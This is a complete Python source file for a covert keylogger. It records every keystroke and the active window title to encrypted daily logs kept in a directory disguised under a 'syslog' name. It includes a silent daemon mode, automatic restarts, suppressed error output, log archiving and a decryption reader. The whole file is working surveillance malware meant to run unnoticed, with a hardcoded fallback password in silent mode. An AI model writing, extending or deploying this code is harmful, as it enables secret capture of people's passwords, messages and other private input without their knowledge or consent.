#!/usr/bin/env python3
"""
Encrypted Keylogger using pynput
Logs keystrokes with UTC timestamps to an encrypted local file using AES-256.
Runs silently in the background.
"""

import os
import sys
import datetime
import hashlib
import getpass
import argparse
import threading
import time
import signal
import glob
import shutil
import subprocess
from pynput import keyboard
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# Platform-specific imports for window title capture
try:
    if os.name == 'nt':  # Windows
        import ctypes
        import ctypes.wintypes
    elif sys.platform == 'darwin':  # macOS
        pass  # Will use subprocess with osascript
    else:  # Linux
        pass  # Will use subprocess with xdotool or wmctrl
except ImportError:
    pass  # Gracefully handle missing platform-specific libraries

# Configuration
# Use user's home directory for cross-platform compatibility
if os.name == 'nt':  # Windows
    LOG_DIR = os.path.join(os.environ['APPDATA'], '.syslog')
else:  # macOS/Linux
    LOG_DIR = os.path.join(os.path.expanduser('~'), '.local', 'share', 'syslog')

# Create log directory if it doesn't exist
os.makedirs(LOG_DIR, exist_ok=True)

# Daily log file naming
def get_current_log_file():
    """Get the current day's log file name"""
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    return os.path.join(LOG_DIR, f"{today}-log.enc")

def get_current_salt_file():
    """Get the current salt file name (shared across all days)"""
    return os.path.join(LOG_DIR, "system.salt")

LOG_FILE = get_current_log_file()  # This will be updated daily
SALT_FILE = get_current_salt_file()
PID_FILE = os.path.join(LOG_DIR, "keylogger.pid")
ARCHIVE_DIR = os.path.join(LOG_DIR, "archive")
LOG_RETENTION_DAYS = 30

# Silent mode flag - when True, suppresses all output
SILENT_MODE = False

def safe_print(message):
    """Print message only if not in silent mode"""
    if not SILENT_MODE:
        print(message)

def cleanup_old_logs():
    """Archive or delete logs older than retention period"""
    try:
        current_date = datetime.datetime.now()
        cutoff_date = current_date - datetime.timedelta(days=LOG_RETENTION_DAYS)
        
        # Create archive directory if it doesn't exist
        os.makedirs(ARCHIVE_DIR, exist_ok=True)
        
        # Find all log files
        log_pattern = os.path.join(LOG_DIR, "*-log.enc")
        log_files = glob.glob(log_pattern)
        
        archived_count = 0
        deleted_count = 0
        
        for log_file in log_files:
            try:
                # Extract date from filename
                filename = os.path.basename(log_file)
                date_str = filename.split('-log.enc')[0]
                file_date = datetime.datetime.strptime(date_str, '%Y-%m-%d')
                
                if file_date < cutoff_date:
                    # Archive the file first
                    archive_file = os.path.join(ARCHIVE_DIR, filename)
                    if not os.path.exists(archive_file):
                        shutil.copy2(log_file, archive_file)
                        archived_count += 1
                    
                    # Delete the original file
                    os.remove(log_file)
                    deleted_count += 1
                    
            except (ValueError, OSError) as e:
                # Log error but continue with other files
                try:
                    error_log = os.path.join(LOG_DIR, "error.log")
                    with open(error_log, "a") as f:
                        f.write(f"{get_timestamp()} - Error processing log file {log_file}: {e}\n")
                except:
                    pass
        
        # Log cleanup activity
        if archived_count > 0 or deleted_count > 0:
            try:
                error_log = os.path.join(LOG_DIR, "maintenance.log")
                with open(error_log, "a") as f:
                    f.write(f"{get_timestamp()} - Log cleanup: archived {archived_count}, deleted {deleted_count} old files\n")
            except:
                pass
                
    except Exception as e:
        try:
            error_log = os.path.join(LOG_DIR, "error.log")
            with open(error_log, "a") as f:
                f.write(f"{get_timestamp()} - Error during log cleanup: {e}\n")
        except:
            pass

def rotate_log_if_needed():
    """Check if we need to rotate to a new day's log file"""
    global LOG_FILE
    current_log_file = get_current_log_file()
    
    if LOG_FILE != current_log_file:
        LOG_FILE = current_log_file
        safe_print(f"Rotated to new log file: {LOG_FILE}")
        
        # Run cleanup on log rotation
        cleanup_old_logs()
        
        return True
    return False

def derive_key_from_password(password, salt):
    """Derive encryption key from password using PBKDF2"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

def get_or_create_salt():
    """Get existing salt or create new one"""
    if os.path.exists(SALT_FILE):
        with open(SALT_FILE, 'rb') as f:
            return f.read()
    else:
        salt = os.urandom(16)
        with open(SALT_FILE, 'wb') as f:
            f.write(salt)
        return salt

def encrypt_message(message, key):
    """Encrypt message using Fernet (AES-256)"""
    f = Fernet(key)
    return f.encrypt(message.encode())

def decrypt_message(encrypted_message, key):
    """Decrypt message using Fernet (AES-256)"""
    f = Fernet(key)
    return f.decrypt(encrypted_message).decode()

def get_timestamp():
    """Get current UTC timestamp in ISO format"""
    return datetime.datetime.utcnow().isoformat() + "Z"

def get_active_window_title():
    """Get the title of the currently active window (cross-platform)"""
    try:
        if os.name == 'nt':  # Windows
            return get_active_window_title_windows()
        elif sys.platform == 'darwin':  # macOS
            return get_active_window_title_macos()
        else:  # Linux
            return get_active_window_title_linux()
    except Exception:
        return "Unknown Window"

def get_active_window_title_windows():
    """Get active window title on Windows"""
    try:
        # Get the active window handle
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        
        # Get the length of the window title
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        
        if length > 0:
            # Create a buffer to hold the title
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        else:
            return "No Title"
    except Exception:
        return "Unknown Window"

def get_active_window_title_macos():
    """Get active window title on macOS"""
    try:
        script = '''
        tell application "System Events"
            set frontApp to name of first application process whose frontmost is true
            tell process frontApp
                set frontWindow to name of front window
                return frontApp & " - " & frontWindow
            end tell
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], 
                              capture_output=True, text=True, timeout=2)
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
        else:
            return "Unknown Window"
    except Exception:
        return "Unknown Window"

def get_active_window_title_linux():
    """Get active window title on Linux"""
    try:
        # Try xdotool first (more reliable)
        try:
            result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except FileNotFoundError:
            pass
        
        # Fallback to wmctrl
        try:
            result = subprocess.run(['wmctrl', '-a', ':ACTIVE:'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                # Parse wmctrl output to get window title
                result = subprocess.run(['wmctrl', '-l'], 
                                      capture_output=True, text=True, timeout=2)
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if line and len(line.split()) >= 4:
                        # wmctrl format: window_id desktop hostname window_title
                        parts = line.split(None, 3)
                        if len(parts) >= 4:
                            return parts[3]
        except FileNotFoundError:
            pass
        
        # Fallback to xwininfo
        try:
            # Get the active window ID
            result = subprocess.run(['xprop', '-root', '_NET_ACTIVE_WINDOW'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                window_id = result.stdout.split()[-1]
                if window_id and window_id != '0x0':
                    # Get the window name
                    result = subprocess.run(['xwininfo', '-id', window_id, '-wm'], 
                                          capture_output=True, text=True, timeout=2)
                    for line in result.stdout.split('\n'):
                        if 'xwininfo: Window id:' in line and '"' in line:
                            # Extract title from xwininfo output
                            title_start = line.find('"') + 1
                            title_end = line.rfind('"')
                            if title_start > 0 and title_end > title_start:
                                return line[title_start:title_end]
        except FileNotFoundError:
            pass
        
        return "Unknown Window"
    except Exception:
        return "Unknown Window"

class KeyloggerState:
    """Global state for the keylogger"""
    def __init__(self):
        self.encryption_key = None
        self.last_window_title = ""
        self.last_window_check = 0
        self.window_check_interval = 1.0  # Check window title every 1 second max

keylogger_state = KeyloggerState()

def get_current_window_context():
    """Get current window title with caching to reduce system calls"""
    current_time = time.time()
    
    # Only check window title if enough time has passed or if we don't have one cached
    if (current_time - keylogger_state.last_window_check > keylogger_state.window_check_interval or 
        not keylogger_state.last_window_title):
        
        keylogger_state.last_window_title = get_active_window_title()
        keylogger_state.last_window_check = current_time
    
    return keylogger_state.last_window_title

def log_keystroke(key_info, encryption_key):
    """Log encrypted keystroke to file with timestamp and window context"""
    # Check if we need to rotate to a new day's log file
    global LOG_FILE
    rotate_log_if_needed()
    
    timestamp = get_timestamp()
    window_title = get_current_window_context()
    
    # Format: timestamp - [window] - keystroke
    log_entry = f"{timestamp} - [{window_title}] - {key_info}"
    
    try:
        encrypted_entry = encrypt_message(log_entry, encryption_key)
        with open(LOG_FILE, "ab") as f:  # Append binary mode
            f.write(encrypted_entry + b'\n')
    except Exception as e:
        # Silent logging - write errors to a separate error log
        try:
            error_log = os.path.join(LOG_DIR, "error.log")
            with open(error_log, "a") as f:
                f.write(f"{timestamp} - Error writing log: {e}\n")
        except:
            pass  # Silently ignore if we can't even write errors

def on_key_press(key):
    """Handle key press events"""
    try:
        # Handle regular alphanumeric keys
        if hasattr(key, 'char') and key.char is not None:
            log_keystroke(f"Key: '{key.char}'", keylogger_state.encryption_key)
        else:
            # Handle special keys
            key_name = str(key).replace('Key.', '')
            log_keystroke(f"Special: {key_name}", keylogger_state.encryption_key)
    except Exception as e:
        # Silent error handling
        try:
            error_log = os.path.join(LOG_DIR, "error.log")
            with open(error_log, "a") as f:
                f.write(f"{get_timestamp()} - Key processing error: {e}\n")
        except:
            pass

def create_pid_file():
    """Create PID file for process management"""
    try:
        with open(PID_FILE, 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

def remove_pid_file():
    """Remove PID file on exit"""
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except:
        pass

def signal_handler(signum, frame):
    """Handle termination signals gracefully"""
    remove_pid_file()
    sys.exit(0)

def start_keylogger():
    """Start the keylogger with encryption"""
    global SILENT_MODE
    
    # Check if already running
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, 'r') as f:
                pid = int(f.read().strip())
            # Check if process is still running
            if os.name == 'nt':  # Windows
                import psutil
                if psutil.pid_exists(pid):
                    safe_print("Keylogger is already running!")
                    return
            else:  # Unix-like
                try:
                    os.kill(pid, 0)
                    safe_print("Keylogger is already running!")
                    return
                except OSError:
                    pass  # Process not running, continue
        except:
            pass  # Invalid PID file, continue
    
    # Get password for encryption
    if SILENT_MODE:
        # In silent mode, use a default password or read from environment
        password = os.environ.get('KEYLOGGER_PASSWORD', 'default_password_change_me')
    else:
        password = getpass.getpass("Enter encryption password: ")
        if not password:
            safe_print("Password cannot be empty!")
            return
    
    # Get or create salt
    salt = get_or_create_salt()
    
    # Derive encryption key
    keylogger_state.encryption_key = derive_key_from_password(password, salt)
    
    # Create PID file
    create_pid_file()
    
    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Run initial cleanup
    cleanup_old_logs()
    
    safe_print("Keylogger started. Logging to:", os.path.abspath(LOG_FILE))
    safe_print("Press Ctrl+C to stop.")
    
    # Create initial log entry
    current_log_file = get_current_log_file()
    if not os.path.exists(current_log_file):
        log_keystroke(f"Keylogger started at {get_timestamp()}", keylogger_state.encryption_key)
        log_keystroke("-" * 50, keylogger_state.encryption_key)
    
    # Main loop with auto-restart capability and daily log rotation
    max_retries = 5
    retry_count = 0
    last_cleanup = datetime.datetime.now()
    
    while retry_count < max_retries:
        try:
            # Set up keyboard listener
            with keyboard.Listener(on_press=on_key_press) as listener:
                # Periodic cleanup check (every hour)
                def periodic_maintenance():
                    nonlocal last_cleanup
                    while True:
                        time.sleep(3600)  # Check every hour
                        current_time = datetime.datetime.now()
                        
                        # Run log rotation check
                        rotate_log_if_needed()
                        
                        # Run cleanup daily
                        if (current_time - last_cleanup).days >= 1:
                            cleanup_old_logs()
                            last_cleanup = current_time
                
                # Start maintenance thread
                maintenance_thread = threading.Thread(target=periodic_maintenance, daemon=True)
                maintenance_thread.start()
                
                listener.join()
            break  # Exit loop if listener exits normally
            
        except KeyboardInterrupt:
            safe_print("\nKeylogger stopped by user.")
            break
            
        except Exception as e:
            retry_count += 1
            try:
                error_log = os.path.join(LOG_DIR, "error.log")
                with open(error_log, "a") as f:
                    f.write(f"{get_timestamp()} - Listener error (attempt {retry_count}): {e}\n")
            except:
                pass
            
            if retry_count < max_retries:
                # Wait before retrying
                time.sleep(min(retry_count * 10, 60))  # Exponential backoff, max 60s
                safe_print(f"Restarting keylogger (attempt {retry_count + 1}/{max_retries})...")
            else:
                try:
                    error_log = os.path.join(LOG_DIR, "error.log")
                    with open(error_log, "a") as f:
                        f.write(f"{get_timestamp()} - Max retries reached, exiting\n")
                except:
                    pass
                break
    
    # Cleanup
    remove_pid_file()

def decrypt_and_read_logs():
    """Decrypt and display all logged keystrokes from all log files"""
    if not os.path.exists(SALT_FILE):
        safe_print("No salt file found! Cannot decrypt logs.")
        return
    
    # Find all log files
    log_pattern = os.path.join(LOG_DIR, "*-log.enc")
    log_files = glob.glob(log_pattern)
    
    # Also check for old format log file
    old_log_file = os.path.join(LOG_DIR, "system.enc")
    if os.path.exists(old_log_file):
        log_files.append(old_log_file)
    
    if not log_files:
        safe_print("No log files found!")
        return
    
    # Sort log files by date (newest first)
    def extract_date(filename):
        basename = os.path.basename(filename)
        if basename == "system.enc":
            return datetime.datetime.min  # Old format, put at beginning
        try:
            date_str = basename.split('-log.enc')[0]
            return datetime.datetime.strptime(date_str, '%Y-%m-%d')
        except:
            return datetime.datetime.min
    
    log_files.sort(key=extract_date, reverse=True)
    
    # Get password for decryption
    password = getpass.getpass("Enter decryption password: ")
    if not password:
        safe_print("Password cannot be empty!")
        return
    
    try:
        # Get salt and derive key
        with open(SALT_FILE, 'rb') as f:
            salt = f.read()
        
        encryption_key = derive_key_from_password(password, salt)
        
        # Read and decrypt log entries from all files
        safe_print("\n" + "="*80)
        safe_print("DECRYPTED KEYLOG ENTRIES")
        safe_print("="*80)
        
        total_entries = 0
        for log_file in log_files:
            safe_print(f"\n--- Log File: {os.path.basename(log_file)} ---")
            
            try:
                with open(log_file, 'rb') as f:
                    file_entries = 0
                    for line_num, encrypted_line in enumerate(f, 1):
                        encrypted_line = encrypted_line.strip()
                        if encrypted_line:
                            try:
                                decrypted_entry = decrypt_message(encrypted_line, encryption_key)
                                safe_print(f"{line_num:4d}: {decrypted_entry}")
                                file_entries += 1
                                total_entries += 1
                            except Exception as e:
                                safe_print(f"{line_num:4d}: [ERROR DECRYPTING ENTRY] - {e}")
                    
                    if file_entries == 0:
                        safe_print("  (No entries in this file)")
                    else:
                        safe_print(f"  ({file_entries} entries)")
                        
            except Exception as e:
                safe_print(f"  [ERROR READING FILE] - {e}")
        
        safe_print("="*80)
        safe_print(f"Total entries across all files: {total_entries}")
        safe_print(f"Total log files: {len(log_files)}")
        
    except Exception as e:
        safe_print(f"Error reading encrypted logs: {e}")
        safe_print("This could be due to:")
        safe_print("- Incorrect password")
        safe_print("- Corrupted log files")
        safe_print("- Missing or corrupted salt file")

def stop_keylogger():
    """Stop running keylogger instance"""
    if not os.path.exists(PID_FILE):
        safe_print("No keylogger PID file found. Is it running?")
        return
    
    try:
        with open(PID_FILE, 'r') as f:
            pid = int(f.read().strip())
        
        if os.name == 'nt':  # Windows
            import psutil
            if psutil.pid_exists(pid):
                os.kill(pid, signal.SIGTERM)
                safe_print(f"Stopped keylogger (PID: {pid})")
            else:
                safe_print("Keylogger process not found.")
        else:  # Unix-like
            try:
                os.kill(pid, signal.SIGTERM)
                safe_print(f"Stopped keylogger (PID: {pid})")
            except OSError:
                safe_print("Keylogger process not found.")
        
        # Clean up PID file
        remove_pid_file()
        
    except Exception as e:
        safe_print(f"Error stopping keylogger: {e}")

def list_log_files():
    """List all available log files with their info"""
    log_pattern = os.path.join(LOG_DIR, "*-log.enc")
    log_files = glob.glob(log_pattern)
    
    # Also check for old format log file
    old_log_file = os.path.join(LOG_DIR, "system.enc")
    if os.path.exists(old_log_file):
        log_files.append(old_log_file)
    
    if not log_files:
        safe_print("No log files found!")
        return
    
    # Sort by date
    def extract_date(filename):
        basename = os.path.basename(filename)
        if basename == "system.enc":
            return datetime.datetime.min
        try:
            date_str = basename.split('-log.enc')[0]
            return datetime.datetime.strptime(date_str, '%Y-%m-%d')
        except:
            return datetime.datetime.min
    
    log_files.sort(key=extract_date, reverse=True)
    
    safe_print("\n" + "="*70)
    safe_print("AVAILABLE LOG FILES")
    safe_print("="*70)
    safe_print(f"{'Filename':<20} {'Date':<12} {'Size':<10} {'Entries':<8}")
    safe_print("-" * 70)
    
    total_size = 0
    total_entries = 0
    
    for log_file in log_files:
        basename = os.path.basename(log_file)
        
        # Get file size
        try:
            size = os.path.getsize(log_file)
            size_str = f"{size:,} B"
            total_size += size
        except:
            size_str = "Unknown"
        
        # Extract date
        if basename == "system.enc":
            date_str = "Legacy"
        else:
            try:
                date_str = basename.split('-log.enc')[0]
            except:
                date_str = "Unknown"
        
        # Count entries (approximate)
        try:
            with open(log_file, 'rb') as f:
                entries = sum(1 for line in f if line.strip())
            entries_str = str(entries)
            total_entries += entries
        except:
            entries_str = "?"
        
        safe_print(f"{basename:<20} {date_str:<12} {size_str:<10} {entries_str:<8}")
    
    safe_print("-" * 70)
    safe_print(f"{'Total:':<20} {len(log_files)} files {'':>1} {total_size:,} B {'':>1} {total_entries}")
    safe_print("="*70)

def cleanup_logs_now():
    """Manually run log cleanup"""
    safe_print("Running log cleanup...")
    cleanup_old_logs()
    safe_print("Log cleanup completed.")

def main():
    """Main function with command line argument parsing"""
    global SILENT_MODE
    
    parser = argparse.ArgumentParser(description="Encrypted Keylogger with Daily Log Rotation")
    parser.add_argument('--read', action='store_true', 
                       help='Decrypt and read existing logs')
    parser.add_argument('--stop', action='store_true',
                       help='Stop running keylogger')
    parser.add_argument('--silent', action='store_true',
                       help='Run in silent mode (no console output)')
    parser.add_argument('--daemon', action='store_true',
                       help='Run as daemon/background process')
    parser.add_argument('--list', action='store_true',
                       help='List all available log files')
    parser.add_argument('--cleanup', action='store_true',
                       help='Manually run log cleanup (archive/delete old files)')
    parser.add_argument('--retention-days', type=int, default=30,
                       help='Number of days to retain logs (default: 30)')
    
    args = parser.parse_args()
    
    # Set retention days
    global LOG_RETENTION_DAYS
    LOG_RETENTION_DAYS = args.retention_days
    
    # Set silent mode
    if args.silent or args.daemon:
        SILENT_MODE = True
    
    # Handle daemon mode for Unix-like systems
    if args.daemon and os.name != 'nt':
        # Fork to background
        try:
            pid = os.fork()
            if pid > 0:
                # Parent process exits
                sys.exit(0)
        except OSError as e:
            safe_print(f"Fork failed: {e}")
            sys.exit(1)
        
        # Child process continues
        os.setsid()  # Create new session
        os.chdir('/')  # Change working directory
        
        # Redirect standard file descriptors
        sys.stdin.close()
        sys.stdout.close()
        sys.stderr.close()
    
    if args.read:
        decrypt_and_read_logs()
    elif args.stop:
        stop_keylogger()
    elif args.list:
        list_log_files()
    elif args.cleanup:
        cleanup_logs_now()
    else:
        start_keylogger()

if __name__ == "__main__":
    main()